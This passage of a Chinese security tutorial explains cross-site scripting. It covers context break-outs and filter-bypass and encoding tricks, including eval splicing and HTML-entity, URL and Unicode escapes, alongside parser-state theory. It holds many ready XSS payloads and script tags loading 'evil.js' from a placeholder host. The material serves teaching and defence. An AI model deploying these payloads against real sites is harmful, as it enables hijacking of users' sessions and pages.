class="line">&#125;</span><br></pre></td></tr></table></figure><p>常见场景：评论，订单，可以参考sql中的二次注入</p></li><li><p>DOM型</p><p>与服务器无交互，漏洞成型点在**<code>javascript</code>文件解析用户输入时**，触发点在客户端渲染DOM时。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  lang 变量通过 document.location.href（当前页面的 URL）来获取</span></span><br><span class="line"><span class="keyword">var</span> lang = document.location.href.<span class="title function_ invoke__">substring</span>(document.location.href.<span class="title function_ invoke__">indexOf</span>(<span class="string">&quot;default=&quot;</span>)+<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 并且没有任何过滤就直接 URL 解码后输出在了 option 标签中</span></span><br><span class="line">document.<span class="title function_ invoke__">write</span>(<span class="string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="string">&quot;&#x27;&gt;&quot;</span> + <span class="variable">$decodeURI</span>(lang) + <span class="string">&quot;&lt;/option&gt;&quot;</span>);</span><br></pre></td></tr></table></figure><p>常见场景：需要审计<code>javascript</code>代码</p></li></ul><h1 id="如何执行javascript"><a href="#如何执行javascript" class="headerlink" title="如何执行javascript"></a>如何执行javascript</h1><ul><li>script标签</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>非script标签</p><ul><li><p><code>on</code>事件</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">&#x27;&#x27;</span> onclick=<span class="string">&#x27;alert(1)&#x27;</span>&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/jsref/dom-obj-event.html">HTML DOM 事件对象 | 菜鸟教程</a></p></li><li><p><code>javascript:</code>  </p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">&#x27;javascript:alert(1)&#x27;</span>&gt;&lt;/a&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(1);</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line">&lt;img src=javascript:alert(1)&gt;    //IE7以下</span><br><span class="line">&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt;</span><br></pre></td></tr></table></figure></li><li><p><code>script</code>标签的src属性</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://xxx/evil.js&quot;</span>&gt;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h1 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h1><h2 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h2><p>当空格被过滤了时，我们可以用 <code>/</code> 来代替空格：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img/src=<span class="string">&quot;x&quot;</span>/onerror=<span class="title function_">alert</span>(<span class="number">1</span>);&gt;</span><br></pre></td></tr></table></figure><p>也可以：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img/src=<span class="string">&quot;x&quot;</span>onerror=<span class="title function_">alert</span>(<span class="number">1</span>);&gt;</span><br></pre></td></tr></table></figure><h2 id="绕过引号"><a href="#绕过引号" class="headerlink" title="绕过引号"></a>绕过引号</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="regexp">/xss/</span>)&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">`xss`</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://xxx/evil.js</span>&gt;</span></span> &lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="绕过括号"><a href="#绕过括号" class="headerlink" title="绕过括号"></a>绕过括号</h2><ul><li>throw</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="string">&quot;javascript:window.onerror=alert;throw 1&quot;</span>&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseover</span>=<span class="string">&quot;javascript:window.onerror=alert;throw 1&gt;</span></span></span></span><br></pre></td></tr></table></figure><ul><li>反引号</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="number">1</span>) == alert<span class="string">`1`</span></span><br></pre></td></tr></table></figure><h2 id="绕过关键字过滤"><a href="#绕过关键字过滤" class="headerlink" title="绕过关键字过滤"></a>绕过关键字过滤</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;sCRiPt&gt;<span class="title function_">alert</span>(<span class="number">1</span>);&lt;/sCrIpT&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">ImG</span> <span class="attr">sRc</span>=<span class="string">x</span> <span class="attr">onerRor</span>=<span class="string">alert(1);</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;scrscriptipt&gt;<span class="title function_">alert</span>(<span class="number">1</span>);&lt;/scrscriptipt&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">imimgg</span> <span class="attr">srsrcc</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1);</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="字符串拼接绕过"><a href="#字符串拼接绕过" class="headerlink" title="字符串拼接绕过"></a>字符串拼接绕过</h3><h4 id="利用eval-函数"><a href="#利用eval-函数" class="headerlink" title="利用eval()函数"></a>利用eval()函数</h4><p>与PHP的eval()函数相同，JavaScript的eval()函数也可以计算 JavaScript 字符串，并把它作为脚本代码来执行。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="string">&quot;a=&#x27;aler&#x27;;b=&#x27;t&#x27;;c=&#x27;(1)&#x27;;eval(a+b+c)&quot;</span>&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">// 在js中，我们可以用反引号代替单双引号</span></span><br></pre></td></tr></table></figure><h4 id="利用top"><a href="#利用top" class="headerlink" title="利用top"></a>利用top</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](`xss`);&lt;/script&gt;</span><br><span class="line">&lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](&quot;xss&quot;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="输出点总结"><a href="#输出点总结" class="headerlink" title="输出点总结"></a>输出点总结</h2><p>WAF最大的问题，在于不知道输出的位置，导致攻击者根据具体环境以及具体输出的标签类型便可以绕过。</p><h3 id="输出在属性里"><a href="#输出在属性里" class="headerlink" title="输出在属性里"></a>输出在属性里</h3><p>例如输出的位置位于value属性中：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input value=&quot;[输出]&quot; type=text&gt;</span><br></pre></td></tr></table></figure><p>我们可以选择直接闭合标签：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;img src=x onerror=alert(1);&gt;</span><br><span class="line"></span><br><span class="line">// 输出后如下:</span><br><span class="line">// &lt;input value=&quot;&quot;&gt;&lt;img src=x onerror=alert(1);&gt;&quot; type=text&gt;</span><br></pre></td></tr></table></figure><p>如果 <code>&lt; &gt;</code> 被过滤的话可以换成选择使用事件来闭合属性，并将后面的引号注释掉或闭合：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot; autofocus onfocus=alert(1)//</span><br><span class="line">&quot; autofocus onfocus=alert(1) &quot;</span><br><span class="line"></span><br><span class="line">// 输出后如下:</span><br><span class="line">// &lt;input value=&quot;&quot; autofocus onfocus=alert(1)//&quot; type=text&gt;</span><br></pre></td></tr></table></figure><p>同样还有很多其他的payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot; onmouseover=prompt(0) x=&quot;</span><br><span class="line">&quot; onfocusin=alert(1) autofocus x=&quot;</span><br><span class="line">&quot; onfocusout=alert(1) autofocus x=&quot;</span><br><span class="line">&quot; onblur=alert(1) autofocus a=&quot;</span><br></pre></td></tr></table></figure><p>还有一些特殊的场景，如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;hidden&quot; value=&quot;[输出]&quot; /&gt;</span><br><span class="line">&lt;input value=&quot;[输出点]&quot; type=&quot;hidden&quot;/&gt;</span><br></pre></td></tr></table></figure><p>这里只能把input标签闭合，然后直接执行脚本，否则会因为type为hidden导致无法执行脚本。</p><h3 id="输出在HTML标签之间"><a href="#输出在HTML标签之间" class="headerlink" title="输出在HTML标签之间"></a>输出在HTML标签之间</h3><p>例如输出的位置如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div id=&quot;body&quot;&gt;[输出]&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>直接提交 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 即可触发XSS，但是当标签是不能执行脚本的标签时，如下面这几个：</p><ul><li><code>&lt;title&gt;&lt;/title&gt;</code></li><li><code>&lt;textarea&gt;&lt;/textarea&gt;</code></li><li><code>&lt;xmp&gt;&lt;/xmp&gt;</code></li><li><code>&lt;iframe&gt;&lt;/iframe&gt;</code></li></ul><p>那么就得先把那个标签闭合（后文会讲到原理），然后在注入XSS语句，例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="输出在script标签之间"><a href="#输出在script标签之间" class="headerlink" title="输出在script标签之间"></a>输出在script标签之间</h3><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    var x = &quot;input&quot;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>可控位置在input，可以闭合script标签插入代码，但是同样我们仅仅闭合双引号就可以执行js代码了：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;;alert(1)//</span><br><span class="line"></span><br><span class="line">// 输出后如下:</span><br><span class="line">// &lt;script&gt;var x = &quot;&quot;;alert(1)//&quot;;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="字符编码绕过"><a href="#字符编码绕过" class="headerlink" title="字符编码绕过"></a>字符编码绕过</h1><p>在XSS中，还有一个绕过关键字过滤的方法，那就是字符编码绕过。这里给出一个编码网站：<a href="https://bianma.bmcx.com/">https://bianma.bmcx.com/</a></p><p>编码属于计算机系统的基础知识，其内容写起来估计也可以出本书了，不过或多或少我们都有所了解，总的来说，编码就是将字符变为二进制数，而解码就是将二进制数还原为字符。从浏览器请求url到在页面上显示出来也经历了一些编码和解码过程，下面大概介绍一下流程。</p><h2 id="请求网页解码流程"><a href="#请求网页解码流程" class="headerlink" title="请求网页解码流程"></a>请求网页解码流程</h2><ul><li><strong>HTML 编码&#x2F;解码</strong></li></ul><p>当浏览器接收到服务端发送来的二进制数据后，首先会对其进行HTML解码，呈现出来的就是我们看到的源代码。具体的解码方式依具体情况而定，所以我们需要在页面中指定编码，防止浏览器按照错误的方式解码，造成乱码。</p><p>但是在HTML中有些字符是和关键词冲突的，比如 <code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>，解码之后，浏览器会误认为它们是HTML标签，如果希望正确地显示预留字符，就需要在HTML中使用对应的HTML字符实体。</p><p>字符实体是一个转义序列，它定义了一般无法在文本内容中输入的单个字符或符号。一个字符实体以一个&amp;符号开头，后面跟着一个预定义的实体的名称，或用&amp;#开头+实体编号+分号来表示。</p><p>常见的HTML字符实体有：</p><table><thead><tr><th>显示结果</th><th>描述</th><th>实体名称</th><th>实体编号</th></tr></thead><tbody><tr><td></td><td>空格</td><td><code> </code></td><td><code> </code></td></tr><tr><td>&lt;</td><td>小于号</td><td><code>&lt;</code></td><td><code>&lt;</code></td></tr><tr><td>&gt;</td><td>大于号</td><td><code>&gt;</code></td><td><code>&gt;</code></td></tr><tr><td>&amp;</td><td>和号</td><td><code>&amp;</code></td><td><code>&amp;</code></td></tr><tr><td>“</td><td>引号</td><td><code>&quot;</code></td><td><code>&quot;</code></td></tr><tr><td>‘</td><td>撇号</td><td><code>&#39;</code>(IE不支持)</td><td><code>&#39;</code></td></tr></tbody></table><p>但并不是所有的字符都有实体名称，但是它们都有自己的实体编号。</p><p>一个HTML解析器作为一个状态机，它从输入流中获取字符并按照转换规则转换到另一种状态。在解析过程中，任何时候它只要遇到一个 <code>&lt;</code> 符号（后面没有跟 <code>/</code>符号）就会进入 <strong>标签开始状态(Tag open state)</strong> ，然后转变到 <strong>标签名状态(Tag name state)</strong> 、 <strong>前属性名状态(before attribute name state)</strong> ……最后进入 <strong>数据状态(Data state)</strong> 并释放当前标签的token。当解析器处于 数据状态(Data state) 时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。</p><p>简单的说就是，浏览器对HTML解码之后就开始解析HTML文档，将众多标签转化为内容树中的DOM节点，此时识别标签的时候，HTML解析器是无法识别那些被实体编码的内容的，只有建立起DOM树，才能对每个节点的内容进行识别，如果出现实体编码，则会进行实体解码，只要是DOM节点里属性的值，都可以被HTML编码和解析。</p><p>所以在PHP中，使用htmlspecialchars()函数把预定义的字符转换为HTML实体，只有等到DOM树建立起来后，才会解析HTML实体，起到了XSS防护作用。</p><ul><li><strong>URL 解码</strong></li></ul><p>URL编码是为了允许URL中存在汉字这样的非标准字符，本质是把一个字符转为%加上UTF-8编码对应的16进制数字。所以又称之为Percent-encoding。</p><p>在服务端接收到请求时，会自动对请求进行一次URL解码。</p><ul><li><strong>JavaScript 解码（只支持Unicode）</strong></li></ul><p>当HTML解析产生DOM节点后，会根据DOM节点来做接下来的解析工作，比如在处理诸如 <code>&lt;script&gt;</code>、<code>&lt;style&gt;</code> 这样的标签时，解析器会自动切换到JavaScript解析模式，而 <code>src</code>、 <code>href</code> 后边加入的 javascript 伪URL，也会进入 JavaScript 的解析模式。</p><p>比如 <code>&lt;a href=&quot;javascript:alert(&#39;\u0031&#39;)&quot;&gt;test&lt;/a&gt;</code>，JavaScript 出发了 JavaScript 解释器，JavaScript 会先对内容进行解析，里边有一个转义字符<code>\u0031</code>，前导的 u 表示他是一个unicode 字符，根据后边的数字，解析为“1”，于是在完成 JavaScript 的解析之后变成了 <code>&lt;a href=&quot;javascript:alert(&#39;1&#39;)&quot;&gt;test&lt;/a&gt;</code>。</p><p><strong>下面用一个普通的XSS代码来说明一下浏览器对其解析的过程。</strong></p><ul><li><code>&lt;a href=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;test&lt;/a&gt;</code></li></ul><p>首先HTML解析器开始工作，并对href中的字符做HTML解码，接下来URL解析器对href值进行解码，正常情况下URL值为一个正常的URL链接，如：<code>https://www.baidu.com</code>，那么URL解析器工作完成后是不需要其他解码的，但是该环境中URL资源类型为Javascript，因此该环境中最后一步Javascript解析器还会进行解码操作，最后解析的脚本将被执行。</p><p>整个解析顺序为3个环节：HTML解码 —&gt;URL解码 —&gt;JS解码</p><p>我们可以对XSS攻击向量做这三种编码都可以成功弹框。</p><h2 id="HTML-实体编码"><a href="#HTML-实体编码" class="headerlink" title="HTML 实体编码"></a>HTML 实体编码</h2><p>我们可以将DOM节点中的内容转化为HTML实体，因为解析HTML之后建立起节点，然后会对DOM节点里面的HTML实体进行解析。HTML 编码主要分为10进制和16进制，格式为以 <code>&amp;#</code> 开头以分号 <code>;</code> 结尾（也可以不带分号）。</p><ul><li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 十进制</span><br><span class="line">&lt;a href=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">// 十六进制</span><br><span class="line">&lt;a href=&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x22;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x22;&amp;#x29;&gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">// 也可以不带分号</span><br><span class="line">&lt;a href=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x22&amp;#x78&amp;#x73&amp;#x73&amp;#x22&amp;#x29&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><ul><li><code>&lt;img src=x onerror=alert(&quot;xss&quot;)&gt;</code></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 十进制</span><br><span class="line">&lt;img src=x onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&gt;</span><br><span class="line"></span><br><span class="line">// 十六进制</span><br><span class="line">&lt;img src=x onerror=&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x22;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x22;&amp;#x29;&gt;</span><br><span class="line"></span><br><span class="line">// 也可以不带分号</span><br><span class="line">&lt;img src=x onerror=&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x22&amp;#x78&amp;#x73&amp;#x73&amp;#x22&amp;#x29&gt;</span><br></pre></td></tr></table></figure><p>但是要注意，对于HTML字符实体，并不是说任何地方都可以使用实体编码，只有处于 “数据状态中的字符引用”、“属性值状态中的字符引用” 和 “RCDATA状态中的字符引用” 这三种状态中的HTML字符实体将会从 <code>&amp;#…</code> 形式解码，转化成对应的解码字符并被放入数据缓冲区中。</p><p><strong>（1）数据状态中的字符引用：</strong>数据状态就是解析一个标签内里面的内容，如 <code>&lt;div&gt;...&lt;/div&gt;</code> 中的内容，当浏览器解析完 <code>&lt;div&gt;</code> 标签之后如果发现标签内还含有实体字符的话，就会有一个实体编码解析了，如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;&amp;#60;img src=x onerror=alert(&quot;xss&quot;)&amp;#62;&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>如下图，此时在页面上显示的是经过转义的内容：</p><p>[<img src="/../images/20210523094712-cb6a83bc-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094712-cb6a83bc-bb68-1.png)</p><p>这看上去是一个标准的标签语言，但并不会触发xss，因为当前HTML解析器处于“数据状态”，不会转换到“标签开始状态”，所以就不会建立新的标签。因此，我们能够利用字符实体编码这个行为来转义用户输入的数据从而确保用户输入的数据只能被解析成“数据”而不是XSS攻击向量。</p><p><strong>（2）属性值状态中的字符引用：</strong>属性值状态中的字符引用就好理解了，就是src，herf这样的属性值中的HTML实体，他也是会先进行HTML解码的，比如下面的语句，会先对里面HTML解码，然后再继续往下执行：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x22;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x22;&amp;#x29;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><strong>（3）RCDATA状态中的字符引用：</strong>然后再来看一下什么是RCDATA转态，这里需要我们先了解一下HTML中有五类元素：</p><ol><li>空元素(Void elements)，如 <code>&lt;area&gt;</code>、<code>&lt;br&gt;</code>、<code>&lt;base&gt;</code> 等等。空元素不能容纳任何内容，因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间。</li><li>原始文本元素(Raw text elements)，有 <code>&lt;script&gt;</code> 和 <code>&lt;style&gt;</code>。原始文本元素可以容纳文本。</li><li>RCDATA元素(RCDATA elements)，有 <code>&lt;textarea&gt;</code> 和 <code>&lt;title&gt;</code>。RCDATA元素可以容纳文本和字符引用。</li><li>外部元素(Foreign elements)，例如MathML命名空间或者SVG命名空间的元素。外部元素可以容纳文本、字符引用、CDATA段、其他元素和注释。</li><li>基本元素(Normal elements)，即除了以上4种元素以外的元素。基本元素可以容纳文本、字符引用、其他元素和注释。</li></ol><p>注意到RCDATA元素中有 <code>&lt;textarea&gt;</code> 和 <code>&lt;title&gt;</code> 两个属性并且有字符引用，也就是当实体字符出现在这两个标签里面的时候，实体字符会被识别并进行HTML编码解析。这里要再提醒一次，在解析这些字符引用的过程中不会进入“标签开始状态”，所以就不会建立新的标签，所以下面这个语句触发不了XSS：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;textarea&gt;&amp;#60;script&amp;#62;alert(&quot;xss&quot;)&amp;#60;/script&amp;#62;&lt;/textarea&gt;</span><br></pre></td></tr></table></figure><p>[<img src="/../images/20210523094713-cbda5a48-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094713-cbda5a48-bb68-1.png)</p><p>但是如果直接放进去标签的内容呢，不带转义字符呢，如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;textarea&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;&lt;/textarea&gt;</span><br></pre></td></tr></table></figure><p>同样也是不会触发XSS的：</p><p><img src="/" alt="img"></p><p>这涉及到了RCDATA的一个特殊的情况。即在浏览器解析RCDATA元素的过程中，解析器会进入“RCDATA状态”。在这个状态中，如果遇到“&lt;”字符，它会转换到“RCDATA小于号状态”。如果“&lt;”字符后没有紧跟着“&#x2F;”和对应的标签名，解析器会转换回“RCDATA状态”，并不会进入“标签开始状态”的。这意味着在RCDATA元素标签的内容中，唯一能够被解析器认做是标签的就只有 <code>&lt;/textarea&gt;</code> 或者 <code>&lt;/title&gt;</code>，因此，在 <code>&lt;textarea&gt;</code> 和 <code>&lt;title&gt;</code> 的内容中不会创建标签，就不会有脚本能够执行了。</p><p>另外还有一点要注意：我们从上面HTML的五类元素中还发现有一个原始文本元素 <code>&lt;script&gt;</code> 在这个标签内容纳的是文本，所以浏览器在解析到这个标签后，里面内容中的HTML编码并不会被认为是HTML实体引用，所以并不会被解码为相应的字符。浏览器看不懂中间这堆编码是和啥东西，所以也不会被执行，如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>[<img src="/../images/20210523094714-cc1f779a-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094714-cc1f779a-bb68-1.png)</p><p>那么如何才能让里面的内容进行转义并执行弹窗呢，这里需要利用到XSS的一个黑魔法——“svg”，我们下文中会提及。</p><h2 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h2><p>我们可以并将src或href属性中的内容进行URL编码，当HTML解析器对src或href中的字符完成HTML解码后，接下来URL解析器会对src或href中的值进行URL解码。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;...&quot;&gt;xx&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;...&quot;&gt;</span><br></pre></td></tr></table></figure><p>下面给出几个实例。</p><ul><li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=javascript:%61%6c%65%72%74%28%22%78%73%73%22%29&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><ul><li><code>&lt;iframe src=javascript:alert(&quot;xss&quot;)&gt;&lt;/iframe&gt;</code></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=&quot;javascript:%61%6c%65%72%74%28%22%78%73%73%22%29&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p>注意，伪协议头 <code>javascript:</code> 是不能进行编码的。这里就有一个URL解析过程中的一个细节了，即不能对协议类型进行任何的编码操作，否则URL解析器会认为它无类型，就会导致DOM节点中被编码的“javascript”没有被解码，当然不会被URL解析器识别了。就比如说 <code>http://www.baidu.com</code> 可以被URL编码为 <code>http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d</code>，但是不能把协议也进URL编码：<code>%68%74%74%70%3a%2f%2f%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d</code> 。</p><p>但是伪协议头 <code>javascript:</code> 可以进行HTML编码。</p><h2 id="Javascript-编码"><a href="#Javascript-编码" class="headerlink" title="Javascript 编码"></a>Javascript 编码</h2><p>我们可以将DOM节点中的内容转化为 Javascript 编码。当HTML解析产生DOM节点后，会根据DOM节点来做接下来的解析工作，比如在处理诸如 <code>&lt;script&gt;</code>、<code>&lt;style&gt;</code> 这样的标签时，解析器会自动切换到JavaScript解析模式，而 <code>src</code>、 <code>href</code> 后边加入的 javascript 伪URL，也会进入 JavaScript 的解析模式。</p><p>Javascript 中可以识别的编码类型有：</p><ul><li>Unicode 编码</li><li>八进制编码</li><li>十六进制编码</li></ul><p>一般情况下我们使用Unicode编码的比较广泛，而八进制和十六进制只有在DOM环境或eval()等函数中才可以用。</p><h3 id="Unicode-编码"><a href="#Unicode-编码" class="headerlink" title="Unicode 编码"></a>Unicode 编码</h3><ul><li><code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(&quot;xss&quot;)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(&quot;\u0078\u0073\u0073&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=javascript:\u0061\u006C\u0065\u0072\u0074(&quot;xss&quot;)&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=javascript:\u0061\u006C\u0065\u0072\u0074(&quot;\u0078\u0073\u0073&quot;)&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>但要注意，我们同样也不能对伪协议头 <code>javascript:</code> 进行 Javascript 编码。并且像圆括号、双引号、单引号这样的符号我们也不能进 Javascript 编码，但是能进行HTML编码。</p><h3 id="在DOM环境中的JavaScript编码"><a href="#在DOM环境中的JavaScript编码" class="headerlink" title="在DOM环境中的JavaScript编码"></a>在DOM环境中的JavaScript编码</h3><p>对于八进制编码和十六进制编码，与 Unicode 编码还是有区别，像下面的XSS向量是不能直接执行的：</p><ul><li><code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;\141\154\145\162\164(&quot;xss&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=javascript:\x61\x6c\x65\x72\x74(&quot;xss&quot;)&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>如下图，插入之后没有任何反应：</p><p>[<img src="/../images/20210523094714-cc651728-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094714-cc651728-bb68-1.png)</p><p>[<img src="/../images/20210523094714-cca61c3c-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 